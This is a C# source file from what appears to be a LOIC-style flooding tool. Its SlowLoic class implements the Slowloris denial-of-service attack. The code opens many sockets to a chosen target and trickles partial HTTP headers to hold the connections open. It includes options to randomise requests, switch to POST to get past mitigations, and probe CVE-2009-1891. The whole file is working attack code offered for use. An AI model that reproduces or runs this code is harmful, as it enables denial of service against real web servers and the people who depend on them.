using GAS.Core.Strings;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;
namespace GAS.Core
{
    /// <summary>
    /// SlowLoic is the port of RSnake's SlowLoris
    /// </summary>
    public class SlowLoic : IAttacker
    {
        private string _dns, _ip, _subSite;
        private int _port, _nSockets;
        private volatile bool _random, _randcmds, _useget, _usegZip, init = false;
        private Thread[] WorkingThreads;
        private volatile List<Socket>[] _lSockets;
        /// <summary>
        /// creates the SlowLoic / -Loris object. <.<
        /// </summary>
        /// <param name="dns">DNS string of the target</param>
        /// <param name="ip">IP string of a specific server. Use this ONLY if the target does loadbalancing between different IPs and you want to target a specific IP. normally you want to provide an empty string!</param>
        /// <param name="port">the Portnumber. however so far this class only understands HTTP.</param>
        /// <param name="subsite">the path to the targeted site / document. (remember: the file has to be at least around 24KB!)</param>
        /// <param name="delay">time in milliseconds between the creation of new sockets.</param>
        /// <param name="timeout">time in seconds between a new partial header is sent on the same connection. the higher the better .. but should be UNDER the READ-timeout _from the server. (30 seemed to be working always so far!)</param>
        /// <param name="random">adds a random string to the subsite</param>
        /// <param name="nSockets">the amount of sockets for this object</param>
        /// <param name="randcmds">randomizes the sent header for every request on the same socket. (however all sockets send the same partial header during the same cyclus)</param>
        /// <param name="useGet">if set to TRUE it uses the GET-command - due to the fact that http-Ready mitigates this change this to FALSE to use POST</param>
        /// <param name="usegZip">turns on the gzip / deflate header to check for: CVE-2009-1891</param>
        public SlowLoic(string dns, string ip, int port, string subSite, int delay, int timeout, bool random, int nSockets, bool randcmds, bool useGet, bool usegZip, int threadcount) {
            ThreadCount = threadcount;
            this.WorkingThreads = new Thread[ThreadCount];
            this.States = new ReqState[ThreadCount];
            this._lSockets = new List<Socket>[ThreadCount];
            for ( int i = 0; i < ThreadCount; i++ ) {
                States[i] = ReqState.Ready;
                _lSockets[i] = new List<Socket>();
            }
            this._dns = ( dns == "" ) ? ip : dns; //hopefully they know what they are doing :)
            this._ip = ip;
            this._port = port;
            this._subSite = subSite;
            this._nSockets = nSockets;
            if ( timeout <= 0 ) this.Timeout = 30000; // 30 seconds 
            else this.Timeout = timeout * 1000;
            this.Delay = delay;
            this._random = random;
            this._randcmds = randcmds;
            this._useget = useGet;
            this._usegZip = usegZip;
            IsDelayed = true;
            Requested = 0; // we reset this! - meaning of this counter changes in this context!
        }
        public override void Start() {
            IsFlooding = true;
            if ( IsFlooding ) Stop();
            IsFlooding = true;
            for ( int i = 0; i < ThreadCount; ( WorkingThreads[i] = new Thread(new ParameterizedThreadStart(bw_DoWork)) ).Start(i++) ) ;
            init = true;
        }
        public override void Stop() {
            IsFlooding = false;
            foreach ( var x in WorkingThreads )
                try { x.Abort(); }
                catch { }
        }
        private void bw_DoWork(object indexinthreads) {
            #region wait 4 full init
            while ( !init ) Thread.Sleep(100);
            int MY_INDEX_FOR_WORK = (int)indexinthreads;
            #endregion
            #region attack
            try {
                #region header set-up
                byte[] sbuf = System.Text.Encoding.ASCII.GetBytes(String.Format("{3} {0} HTTP/1.1{1}HOST: {2}{1}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){1}Keep-Alive: 300{1}Connection: keep-alive{1}Content-Length: 42{1}{4}", _subSite, Environment.NewLine, _dns, ( ( _useget ) ? "GET" : "POST" ), ( ( _usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" )));
                byte[] tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b{\r\n");
                States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                var stop = DateTime.Now;
                #endregion
                while ( IsFlooding ) {
                    stop = DateTime.Now.AddMilliseconds(Timeout);
                    States[MY_INDEX_FOR_WORK] = ReqState.Connecting; // SET STATE TO CONNECTING //
                    while ( IsDelayed && ( DateTime.Now < stop ) ) {
                        #region Headers
                        if ( _random ) sbuf = System.Text.Encoding.ASCII.GetBytes(
                              String.Format(
                              "{4} {0}{1} HTTP/1.1{2}HOST: {3}{2}User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0){2}Keep-Alive: 300{2}Connection: keep-alive{2}Content-Length: 42{2}{5}",
                              _subSite,
                              Functions.RandomString(),
                              Environment.NewLine,
                              _dns,
                              ( ( _useget ) ? "GET" : "POST" ),
                              ( ( _usegZip ) ? ( "Accept-Encoding: gzip,deflate" + Environment.NewLine ) : "" )));
                        #endregion
                        #region Request
                        var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        try {
                            socket.Connect(( ( _ip == "" ) ? _dns : _ip ), _port);
                            socket.NoDelay = true;
                            socket.Blocking = false;
                            socket.Send(sbuf);
                        }
                        catch { }
                        #endregion
                        #region Check result
                        if ( socket.Connected ) {
                            _lSockets[MY_INDEX_FOR_WORK].Add(socket);
                            Requested++;
                        }
                        IsDelayed = ( _lSockets[MY_INDEX_FOR_WORK].Count < _nSockets );
                        if ( IsDelayed && ( Delay > 0 ) ) System.Threading.Thread.Sleep(Delay);
                        #endregion
                    }
                    States[MY_INDEX_FOR_WORK] = ReqState.Requesting;
                    if ( _randcmds ) tbuf = System.Text.Encoding.ASCII.GetBytes("X-a: b" + Functions.RandomString() + "\r\n");
                    #region keep the sockets alive
                    for ( int i = ( _lSockets[MY_INDEX_FOR_WORK].Count - 1 ); i >= 0; i-- ) {
                        try {
                            #region Remove dead
                            if ( !_lSockets[MY_INDEX_FOR_WORK][i].Connected || ( _lSockets[MY_INDEX_FOR_WORK][i].Send(tbuf) <= 0 ) ) {
                                _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                                Failed++;
                                Requested--; // the "requested" number in the stats shows the actual open sockets
                            }
                            #endregion
                            else Downloaded++; // this number is actually BS .. but we wanna see sth happen :D
                        }
                        #region Remove dead
                        catch {
                            _lSockets[MY_INDEX_FOR_WORK].RemoveAt(i);
                            Failed++;
                            Requested--;
                        }
                        #endregion
                    }
                    #endregion
                    #region Stats
                    States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                    IsDelayed = ( _lSockets[MY_INDEX_FOR_WORK].Count < _nSockets );
                    if ( !IsDelayed ) System.Threading.Thread.Sleep(Timeout);
                    #endregion
                }
            }
            catch { States[MY_INDEX_FOR_WORK] = ReqState.Failed; }
            #endregion
            #region Cleanup
            finally {
                IsFlooding = false;
                for ( int i = ( _lSockets[MY_INDEX_FOR_WORK].Count - 1 ); i >= 0; i-- )
                    try { _lSockets[MY_INDEX_FOR_WORK][i].Close(); }
                    catch { }
                _lSockets[MY_INDEX_FOR_WORK].Clear();
                States[MY_INDEX_FOR_WORK] = ReqState.Ready;
                IsDelayed = true;
            }
            #endregion
        }
    }
}
